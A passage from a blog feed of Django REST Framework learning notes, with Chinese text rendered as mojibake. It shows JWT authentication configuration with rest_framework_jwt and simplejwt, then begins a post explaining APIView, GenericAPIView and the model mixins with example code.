id="views.py-1">views.py</h3><div class="note warning"><p>Ê≠§Â§ÑËÆæÁΩÆÁöÑÊòØÂ±ÄÈÉ®ÈÖçÁΩÆ</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"><span class="comment"># ÂøÖÈ°ªÁôªÂΩïÂêéÊâçËÉΩËÆøÈóÆ - ÈÄöËøá‰∫ÜËÆ§ËØÅÊùÉÈôêÁªÑ‰ª∂</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.authentication <span class="keyword">import</span> JSONWebTokenAuthentication</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDetail</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication]  <span class="comment"># Â±ÄÈÉ®ÈÖçÁΩÆjwt-tokenÊ†°È™årequest.user</span></span><br><span class="line">    permission_classes = [IsAuthenticated]  <span class="comment"># ÁªìÂêàÊùÉÈôêÁªÑ‰ª∂Á≠õÈÄâÊéâÊ∏∏ÂÆ¢</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=&#123;<span class="string">'username'</span>: request.user.username&#125;)</span><br></pre></td></tr></table></figure><h3 id="url.py">url.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ObtainJSONWebTokenËßÜÂõæÁ±ªÂ∞±ÊòØÈÄöËøáusernameÂíåpasswordÂæóÂà∞userÂØπË±°ÁÑ∂ÂêéÁ≠æÂèëtokenÔºàÁîüÊàêtokenÔºâ</span></span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.views <span class="keyword">import</span> ObtainJSONWebToken, obtain_jwt_token</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'jwt/'</span>, obtain_jwt_token),</span><br><span class="line">    path(<span class="string">'user/detail/'</span>, views.UserDetail.as_view()),</span><br></pre></td></tr></table></figure><h2 id="drfÊèí‰ª∂-django-rest-framework-simplejwt">DRFÊèí‰ª∂ django-rest-framework-simplejwt</h2><p>Á§∫‰æã‰ª£Á†ÅÂ¶Ç‰∏ã</p><h3 id="settings.py-2">settings.py</h3><div class="note warning"><p>Ê≠§Â§ÑËÆæÁΩÆÁöÑÊòØÂÖ®Â±ÄÈÖçÁΩÆ</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># ËÆ§ËØÅÁ±ªÈÖçÁΩÆ</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">        <span class="string">'rest_framework_simplejwt.authentication.JWTAuthentication'</span>, <span class="comment"># ÂÖ®Â±ÄÈÖçÁΩÆ</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ê≠§Â§ñÔºåËøòÊúâsimplejwtÁöÑ‰∏Ä‰∫õÁªÜËäÇÈÖçÁΩÆÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Reference :</span></span><br><span class="line"><span class="comment"># 1. https://django-rest-framework-simplejwt.readthedocs.io/en/latest/settings.html</span></span><br><span class="line"><span class="comment"># 2. https://juejin.im/post/5d23f43df265da1bcc196749#heading-15</span></span><br><span class="line">SIMPLE_JWT = &#123;</span><br><span class="line">    <span class="string">'ACCESS_TOKEN_LIFETIME'</span>: timedelta(minutes=<span class="number">5</span>),</span><br><span class="line">    <span class="string">'REFRESH_TOKEN_LIFETIME'</span>: timedelta(days=<span class="number">1</span>),</span><br><span class="line">    <span class="string">'ROTATE_REFRESH_TOKENS'</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">'BLACKLIST_AFTER_ROTATION'</span>: <span class="literal">True</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'ALGORITHM'</span>: <span class="string">'HS256'</span>,</span><br><span class="line">    <span class="string">'SIGNING_KEY'</span>: SECRET_KEY,</span><br><span class="line">    <span class="string">'VERIFYING_KEY'</span>: <span class="literal">None</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'AUTH_HEADER_TYPES'</span>: (<span class="string">'Bearer'</span>,),</span><br><span class="line">    <span class="string">'USER_ID_FIELD'</span>: <span class="string">'id'</span>,</span><br><span class="line">    <span class="string">'USER_ID_CLAIM'</span>: <span class="string">'user_id'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'AUTH_TOKEN_CLASSES'</span>: (<span class="string">'rest_framework_simplejwt.tokens.AccessToken'</span>,),</span><br><span class="line">    <span class="string">'TOKEN_TYPE_CLAIM'</span>: <span class="string">'token_type'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'JTI_CLAIM'</span>: <span class="string">'jti'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'SLIDING_TOKEN_REFRESH_EXP_CLAIM'</span>: <span class="string">'refresh_exp'</span>,</span><br><span class="line">    <span class="string">'SLIDING_TOKEN_LIFETIME'</span>: timedelta(minutes=<span class="number">5</span>),</span><br><span class="line">    <span class="string">'SLIDING_TOKEN_REFRESH_LIFETIME'</span>: timedelta(days=<span class="number">1</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="models.py-2">models.py</h3><p>‰ª£Á†ÅÂêå‰∏ä</p><h3 id="views.py-2">views.py</h3><div class="note warning"><p>Ê≠§Â§ÑËÆæÁΩÆÁöÑÊòØÂ±ÄÈÉ®ÈÖçÁΩÆ</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"><span class="comment"># ÂøÖÈ°ªÁôªÂΩïÂêéÊâçËÉΩËÆøÈóÆ - ÈÄöËøá‰∫ÜËÆ§ËØÅÊùÉÈôêÁªÑ‰ª∂</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_simplejwt.authentication <span class="keyword">import</span> JWTAuthentication</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDetail2</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    authentication_classes = [JWTAuthentication]  <span class="comment"># Â±ÄÈÉ®ÈÖçÁΩÆsimplejwt-tokenÊ†°È™årequest.user</span></span><br><span class="line">    permission_classes = [IsAuthenticated]  <span class="comment"># ÁªìÂêàÊùÉÈôêÁªÑ‰ª∂Á≠õÈÄâÊéâÊ∏∏ÂÆ¢</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=&#123;<span class="string">'username'</span>: request.user.username&#125;)</span><br></pre></td></tr></table></figure><h3 id="url.py-1">url.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ObtainJSONWebTokenËßÜÂõæÁ±ªÂ∞±ÊòØÈÄöËøáusernameÂíåpasswordÂæóÂà∞userÂØπË±°ÁÑ∂ÂêéÁ≠æÂèëtokenÔºàÁîüÊàêtokenÔºâ</span></span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.views <span class="keyword">import</span> ObtainJSONWebToken, obtain_jwt_token</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'simple_jwt/'</span>, TokenObtainPairView.as_view(), name=<span class="string">'token_obtain_pair'</span>),</span><br><span class="line">    path(<span class="string">'simple_jwt/refresh/'</span>, TokenRefreshView.as_view(), name=<span class="string">'token_refresh'</span>),</span><br><span class="line">    path(<span class="string">'user/detail2/'</span>, views.UserDetail2.as_view()),</span><br></pre></td></tr></table></figure><h1 id="ÂèÇËÄÉÈìæÊé•-Êâ©Â±ïÈòÖËØª">ÂèÇËÄÉÈìæÊé• &amp; Êâ©Â±ïÈòÖËØª</h1><p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81ZDIzZjQzZGYyNjVkYTFiY2MxOTY3NDk=">„ÄêDRF„ÄëÁî®Êà∑Ê≥®ÂÜåÁôªÂΩïÂèäJWT<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE4LzA3L2pzb25fd2ViX3Rva2VuLXR1dG9yaWFsLmh0bWw=">JSON Web Token ÂÖ•Èó®ÊïôÁ®ã<i class="fa fa-external-link-alt"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂçÅÔºâÔºöÈÄöÁî®ËßÜÂõæ„ÄÅËßÜÂõæÂ∑•ÂÖ∑Á±ª„ÄÅËßÜÂõæÈõÜ‰ª•ÂèäË∑ØÁî±</title>
      <link href="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/"/>
      <url>/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (10): Generic Views, MixIns, ViewSets and Routers</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†Å<ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdmlld3MucHk=">rest_framework.views<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvZ2VuZXJpY3MucHk=">rest_framework.generics<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdmlld3NldHMucHk=">rest_framework.viewsets<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcm91dGVycy5weQ==">rest_framework.routers<i class="fa fa-external-link-alt"></i></span></li></ul></li><li>ÂÆòÊñπÊñáÊ°£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZ2VuZXJpYy12aWV3cy8=">API Guide - Generic views<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvdmlld3NldHMv">API Guide - ViewSets<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcm91dGVycy8=">API Guide - Routers<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEwX2RyZl92aWV3cw==">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="aipview---apiËßÜÂõæÁ±ª">AIPView - APIËßÜÂõæÁ±ª</h1><p><code>APIView</code>ÊòØDjango REST FrameworkÊèê‰æõÁöÑÊâÄÊúâËßÜÂõæÁöÑÂü∫Á±ªÔºåÁªßÊâøËá™DjangoÁöÑ<code>View</code>Áà∂Á±ª„ÄÇ</p><h2 id="‰∏édjango-viewÁöÑ‰∏çÂêå">‰∏éDjango <code>View</code>ÁöÑ‰∏çÂêå</h2><ol type="1"><li>‰º†ÂÖ•Âà∞ËßÜÂõæÊñπÊ≥ï‰∏≠ÁöÑÊòØREST frameworkÁöÑ<code>Request</code>ÂØπË±°ÔºåËÄå‰∏çÊòØDjangoÁöÑ<code>HttpRequeset</code>ÂØπË±°</li><li>ËßÜÂõæÊñπÊ≥ïÂèØ‰ª•ËøîÂõûREST frameworkÁöÑ<code>Response</code>ÂØπË±°ÔºåËßÜÂõæ‰ºö‰∏∫ÂìçÂ∫îÊï∞ÊçÆËÆæÁΩÆÔºàrenderÔºâÁ¨¶ÂêàÂâçÁ´ØË¶ÅÊ±ÇÁöÑÊ†ºÂºè</li><li>‰ªª‰Ωï<code>APIException</code>ÂºÇÂ∏∏ÈÉΩ‰ºöË¢´ÊçïËé∑Âà∞ÔºåÂπ∂‰∏îÂ§ÑÁêÜÊàêÂêàÈÄÇÁöÑÂìçÂ∫î‰ø°ÊÅØ</li><li>Âú®ËøõË°å<code>dispatch()</code>ÂàÜÂèëÂâçÔºå‰ºöÂØπËØ∑Ê±ÇËøõË°åË∫´‰ªΩËÆ§ËØÅ„ÄÅÊùÉÈôêÊ£ÄÊü•„ÄÅÊµÅÈáèÊéßÂà∂</li></ol><h2 id="ÈáçË¶ÅÁ±ªÂ±ûÊÄß">ÈáçË¶ÅÁ±ªÂ±ûÊÄß</h2><p><code>AIPView</code>ÊúâÂ¶Ç‰∏ãÂèØËÆæÁΩÆÁöÑÈáçË¶ÅÁ±ªÂ±ûÊÄßÔºö</p><ul><li><code>authentication_classes</code>ÔºöÂàóË°®ÊàñÂÖÉÁ•ñÔºåË∫´‰ªΩËÆ§ËØÅÁ±ª</li><li><code>permissoin_classes</code>ÔºöÂàóË°®ÊàñÂÖÉÁ•ñÔºåÊùÉÈôêÊ£ÄÊü•Á±ª</li><li><code>throttle_classes</code>ÔºöÂàóË°®ÊàñÂÖÉÁ•ñÔºåÊµÅÈáèÊéßÂà∂Á±ª</li></ul><h2 id="Á§∫‰æã‰ª£Á†Å">Á§∫‰æã‰ª£Á†Å</h2><p>Âú®<code>APIView</code>‰∏≠‰ªçÊúâ<code>get()</code>Ôºå<code>post()</code>Á≠âÂÖ∂‰ªñËØ∑Ê±ÇÊñπÂºèÁöÑÊñπÊ≥ï</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="comment"># path('books/', views.BookListView.as_view()),</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        books = BookInfo.objects.all()</span><br><span class="line">        serializer = BookInfoSerializer(books, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(serializer.data)</span><br></pre></td></tr></table></figure><h1 id="genericapiview---ÈÄöÁî®apiËßÜÂõæÁ±ª">GenericAPIView - ÈÄöÁî®APIËßÜÂõæÁ±ª</h1><p>ÈÄöÁî®APIËßÜÂõæÁ±ª<code>GenericAPIView</code>ÁªßÊâøËá™<code>APIView</code>ÔºåÂÆåÂÖ®ÂÖºÂÆπ<code>APIView</code>Ôºå‰∏ªË¶ÅÂ¢ûÂä†‰∫ÜÊìç‰ΩúÂ∫èÂàóÂåñÂô®ÂíåÊï∞ÊçÆÂ∫ìÊü•ËØ¢ÁöÑÊñπÊ≥ïÔºå‰ΩúÁî®ÊòØ‰∏∫‰∏ãÈù¢<code>Mixin</code>Êâ©Â±ïÁ±ªÁöÑÊâßË°åÊèê‰æõÂü∫Á°ÄÁ±ªÊîØÊåÅ„ÄÇÈÄöÂ∏∏Âú®‰ΩøÁî®Êó∂ÔºåÂèØ‰ª•ÈÖçÂêà‰∏Ä‰∏™ÊàñÂ§ö‰∏™<code>Mixin</code>Êâ©Â±ïÁ±ª„ÄÇ</p><h2 id="genericapiviewÊØîapiviewÂ§ö‰∫Ü‰ªÄ‰πà"><code>GenericAPIView</code>ÊØî<code>APIView</code>Â§ö‰∫Ü‰ªÄ‰πà</h2><ol type="1"><li><code>get_queryset()</code>Ôºö‰ªéÁ±ªÂ±ûÊÄß<code>queryset‰∏≠</code>Ëé∑Âæó<code>model</code>ÁöÑ<code>queryset</code>Êï∞ÊçÆ„ÄÇÁæ§Êìç‰ΩúÂ∞±Ëµ∞<code>get_queryset()</code>ÊñπÊ≥ï(ÂåÖÊã¨Áæ§Êü•ÔºåÁæ§Â¢ûÁ≠â)„ÄÇ</li><li><code>get_object()</code>Ôºö‰ªéÁ±ªÂ±ûÊÄß<code>queryset</code>‰∏≠Ëé∑Âæó<code>model</code>ÁöÑ<code>queryset</code>Êï∞ÊçÆÔºåÂÜçÈÄöËøáÊúâÂêçÂàÜÁªÑ<code>pk</code>Á°ÆÂÆöÂîØ‰∏ÄÊìç‰ΩúÂØπË±°„ÄÇÂçïÊìç‰ΩúÂ∞±Ëµ∞<code>get_object()</code>ÊñπÊ≥ïÔºàÂåÖÊã¨ÂçïÊü•ÔºåÂçïÂ¢ûÁ≠âÔºâ„ÄÇ</li><li><code>get_serializer()</code>Ôºö‰ªéÁ±ªÂ±ûÊÄß<code>serializer_class</code>‰∏≠Ëé∑Âæó<code>serializer</code>ÁöÑÂ∫èÂàóÂåñÁ±ª„ÄÇ</li></ol><h2 id="ÈáçË¶ÅÁ±ªÂ±ûÊÄß-1">ÈáçË¶ÅÁ±ªÂ±ûÊÄß</h2><p><code>GenericAPIView</code>ÊúâÂ¶Ç‰∏ãÂèØËÆæÁΩÆÁöÑÈáçË¶ÅÁ±ªÂ±ûÊÄßÔºö</p><ul><li>ÂàóË°®ËßÜÂõæ‰∏éËØ¶ÊÉÖËßÜÂõæÂÖ±Áî®<ul><li><code>queryset</code>ÔºöÊåáÊòéËßÜÂõæÈúÄË¶ÅÁöÑÊï∞ÊçÆÔºà<code>model</code>Êü•ËØ¢Êï∞ÊçÆÔºâ</li><li><code>permissoin_classes</code>ÔºöÊåáÊòéËßÜÂõæ‰ΩøÁî®ÁöÑÂ∫èÂàóÂåñÂô®</li></ul></li><li>ÂàóË°®ËßÜÂõæ‰ΩøÁî®<ul><li><code>pagination_class</code>ÔºöÊåáÂÆöÂàÜÈ°µÊéßÂà∂Á±ª</li><li><code>filter_backends</code>ÔºöÊåáÂÆöËøáÊª§ÊéßÂà∂ÂêéÁ´Ø</li></ul></li><li>ËØ¶ÊÉÖÈ°µËßÜÂõæ‰ΩøÁî®<ul><li><code>lookup_field</code>ÔºöËá™ÂÆö‰πâ‰∏ªÈîÆÔºåÊúâÂêçÂàÜÁªÑÁöÑÊü•ËØ¢ÔºåÈªòËÆ§ÊòØ<code>pk</code></li><li><code>lookup_url_kwarg</code>ÔºöÊü•ËØ¢Âçï‰∏ÄÊï∞ÊçÆÊó∂url‰∏≠ÁöÑÂèÇÊï∞ÂÖ≥ÈîÆÂ≠óÂêçÁß∞ÔºåÈªòËÆ§‰∏é<code>look_field</code>Áõ∏Âêå</li></ul></li></ul><h2 id="ÈáçË¶ÅÁ±ªÊñπÊ≥ï">ÈáçË¶ÅÁ±ªÊñπÊ≥ï</h2><ul><li><code>get_queryset()</code>Ôºö‰ªéÁ±ªÂ±ûÊÄß<code>queryset</code>‰∏≠Ëé∑Âæó<code>model</code>ÁöÑ<code>queryset</code>Êï∞ÊçÆ„ÄÄ„ÄÄ</li><li><code>get_object()</code>Ôºö‰ªéÁ±ªÂ±ûÊÄß<code>queryset</code>‰∏≠Ëé∑Âæó<code>model</code>ÁöÑ<code>queryset</code>Êï∞ÊçÆÔºåÂÜçÈÄöËøáÊúâÂêçÂàÜÁªÑ<code>pk</code>Êù•Á°ÆÂÆöÂîØ‰∏ÄÊìç‰ΩúÂØπË±°</li><li><code>get_serializer()</code>Ôºö‰ªéÁ±ªÂ±ûÊÄß<code>serializer_class</code>‰∏≠Ëé∑Âæó<code>serializer</code>ÁöÑÂ∫èÂàóÂåñÁ±ªÔºå‰∏ªË¶ÅÁî®Êù•Êèê‰æõÁªô<code>Mixin</code>Êâ©Â±ïÁ±ª‰ΩøÁî®</li></ul><h2 id="get_serializer-Ê∫êÁ†Å"><code>get_serializer</code> Ê∫êÁ†Å</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_serializer</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Return the serializer instance that should be used for validating and</span></span><br><span class="line"><span class="string">    deserializing input, and for serializing output.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    serializer_class = self.get_serializer_class()</span><br><span class="line">    kwargs[<span class="string">'context'</span>] = self.get_serializer_context()</span><br><span class="line">    <span class="keyword">return</span> serializer_class(*args, **kwargs)</span><br></pre></td></tr></table></figure><h2 id="Á§∫‰æã‰ª£Á†Å-1">Á§∫‰æã‰ª£Á†Å</h2><h3 id="ËßÜÂõæÂ±Ç-views.py">ËßÜÂõæÂ±Ç <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookGenericAPIView</span><span class="params">(GenericAPIView)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line">    lookup_field = <span class="string">'pk'</span>  <span class="comment"># ÂÖàÂÆö‰πâÂ•ΩÔºåÂçïÊü•ÂèØ‰ª•‰ΩøÁî®ÔºåÈªòËÆ§ÊòØpk  Ëá™ÂÆö‰πâ‰∏ªÈîÆÁöÑÊúâÂêçÂàÜÁªÑÔºåÂ¶ÇÊûúË∑ØÁî±ÊúâÂêçÂàÜÁªÑ‰∏çÊòØpk,Ëøô‰∏™Â±ûÊÄßÂ∞±Ë¶ÅËá™Â∑±ËÆæÁΩÆ‰∫Ü</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Áæ§Âèñ</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        book_query = self.get_queryset()  <span class="comment"># Ëé∑ÂèñquerysetÊï∞ÊçÆÔºàmodelÊü•ËØ¢Êï∞ÊçÆÔºâ</span></span><br><span class="line">        book_ser = self.get_serializer(book_query, many=<span class="literal">True</span>)</span><br><span class="line">        book_data = book_ser.data</span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=book_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># # ÂçïÂèñ</span></span><br><span class="line">    <span class="comment"># def get(self, request, *args, **kwargs):</span></span><br><span class="line">    <span class="comment">#     book_query = self.get_object()</span></span><br><span class="line">    <span class="comment">#     book_ser = self.get_serializer(book_query)</span></span><br><span class="line">    <span class="comment">#     book_data = book_ser.data</span></span><br><span class="line">    <span class="comment">#     return APIResponse(results=book_data)</span></span><br></pre></td></tr></table></figure><h3 id="Ë∑ØÁî±Â±Ç-urls.py">Ë∑ØÁî±Â±Ç <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v2/books/'</span>, views.BookGenericAPIView.as_view()),</span><br><span class="line">    path(<span class="string">'v2/books/&lt;pk&gt;/'</span>, views.BookGenericAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="xxxmodelmixin---ËßÜÂõæÁ±ªÁöÑÊ®°ÂûãÂ∑•ÂÖ∑ÈõÜ"><code>xxxModelMixin</code> - ËßÜÂõæÁ±ªÁöÑÊ®°ÂûãÂ∑•ÂÖ∑ÈõÜ</h1><h2 id="‰ΩúÁî®">‰ΩúÁî®</h2><ul><li>Êèê‰æõ‰∫ÜÂá†ÁßçÂêéÁ´ØËßÜÂõæÔºàÂØπÊï∞ÊçÆËµÑÊ∫êÁöÑÂ¢ûÂà†ÊîπÊü•ÔºâÂ§ÑÁêÜÊµÅÁ®ãÁöÑÂÆûÁé∞ÔºåÂ¶ÇÊûúÈúÄË¶ÅÁºñÂÜôÁöÑËßÜÂõæÂ±û‰∫éËøô‰∫îÁßçÔºåÂàôËßÜÂõæÂèØ‰ª•ÈÄöËøáÁªßÊâøÁõ∏Â∫îÁöÑÊâ©Â±ïÁ±ªÊù•Â§çÁî®‰ª£Á†ÅÔºåÂáèÂ∞ëËá™Â∑±ÁºñÂÜôÁöÑ‰ª£Á†ÅÈáè„ÄÇ</li><li><code>mixins</code>Êúâ‰∫î‰∏™Â∑•ÂÖ∑Á±ªÊñá‰ª∂Ôºå‰∏ÄÂÖ±Êèê‰æõ‰∫Ü‰∫î‰∏™Â∑•ÂÖ∑Á±ªÔºåÂÖ≠‰∏™Â∑•ÂÖ∑ÊñπÊ≥ïÔºöÂçïÊü•„ÄÅÁæ§Êü•„ÄÅÂçïÂ¢û„ÄÅÂçïÂà†„ÄÅÂçïÊï¥‰ΩìÊîπ„ÄÅÂçïÂ±ÄÈÉ®Êîπ</li></ul><h2 